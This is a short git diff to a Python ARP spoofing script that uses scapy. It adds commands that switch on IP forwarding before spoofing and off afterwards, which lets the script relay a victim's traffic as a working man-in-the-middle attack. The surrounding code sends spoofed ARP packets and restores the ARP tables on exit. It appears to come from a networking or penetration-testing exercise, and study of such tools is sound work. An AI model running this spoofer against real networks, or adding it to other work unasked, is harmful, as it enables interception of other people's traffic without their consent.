@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import scapy.all as scapy
+import subprocess
 import time
 import sys
 import argparse
@@ -45,6 +46,8 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, verbose=False, count=4)
 
 
+subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+
 ips = get_arguments()
 target_ip = ips.target_ip
 gateway_ip = ips.gateway_ip
@@ -62,3 +65,5 @@ except KeyboardInterrupt:
     print("\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.")
     restore(target_ip, gateway_ip)
     restore(gateway_ip, target_ip)
+
+subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
